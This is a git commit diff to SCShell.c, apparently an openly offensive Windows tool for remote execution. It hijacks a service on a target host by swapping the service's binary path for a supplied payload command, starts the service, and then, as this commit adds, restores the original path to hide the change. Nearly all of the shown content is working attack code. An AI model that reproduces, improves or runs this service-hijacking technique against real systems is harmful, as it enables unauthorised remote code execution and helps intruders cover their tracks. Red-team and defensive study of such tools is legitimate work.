3eeeea973e6195348a3ece889a82057923d5cbd6
Mr.Un1k0d3r <mr.un1k0d3r@gmail.com>
2019-11-14 09:59:28 -0500

    Update SCShell.c

--- SCShell.c
+++ SCShell.c
@@ -12,10 +12,13 @@ int main(int argc, char **argv) {
     CHAR* username = argv[4];
     CHAR* domain = argv[5];
     CHAR* password = argv[6];
+    LPQUERY_SERVICE_CONFIGA lpqsc = NULL;
+    DWORD dwLpqscSize = 0;
+    CHAR* originalBinaryPath = NULL;
     BOOL bResult = FALSE;
 
     printf("SCShell ***\n");
-    if(argc < 2) {
+    if(argc < 3) {
         ExitProcess(0);
     }
 
@@ -56,22 +59,44 @@ int main(int argc, char **argv) {
     }
     printf("SC_HANDLE Service 0x%p\n", schService);
 
+    DWORD dwSize = 0;
+    QueryServiceConfigA(schService, NULL, 0, &dwSize);
+    if(dwSize) {
+        // This part is not critical error will not stop the program
+        dwLpqscSize = dwSize;
+        printf("LPQUERY_SERVICE_CONFIGA need 0x%08x bytes\n", dwLpqscSize);
+        lpqsc = GlobalAlloc(GPTR, dwSize);
+        bResult = FALSE;
+        bResult = QueryServiceConfigA(schService, lpqsc, dwLpqscSize, &dwSize);
+        originalBinaryPath = lpqsc->lpBinaryPathName;
+        printf("Original service binary path \"%s\"\n", originalBinaryPath);
+    }
+
     bResult = FALSE;
     bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, payload, NULL, NULL, NULL, NULL, NULL, NULL);
     if(!bResult) {
         printf("ChangeServiceConfigA failed to update the service path. %ld\n", GetLastError());
         ExitProcess(0);
     }
-    printf("Service path was changed to %s\n", payload);
+    printf("Service path was changed to \"%s\"\n", payload);
 
     bResult = FALSE;
     bResult = StartServiceA(schService, NULL, NULL);
     DWORD dwResult = GetLastError();
     if(!bResult && dwResult != 1053) {
         printf("StartServiceA failed to start the service. %ld\n", GetLastError());
-        ExitProcess(0);
+    } else {
+        printf("Service was started\n");
     }
 
-    printf("Service was started\n");
+    if(dwLpqscSize) {
+        bResult = FALSE;
+        bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, originalBinaryPath, NULL, NULL, NULL, NULL, NULL, NULL);
+        if(!bResult) {
+            printf("ChangeServiceConfigA failed to revert the service path. %ld\n", GetLastError());
+            ExitProcess(0);
+        }
+        printf("Service path was restored to \"%s\"\n", originalBinaryPath);
+    }
     return 0;
 }
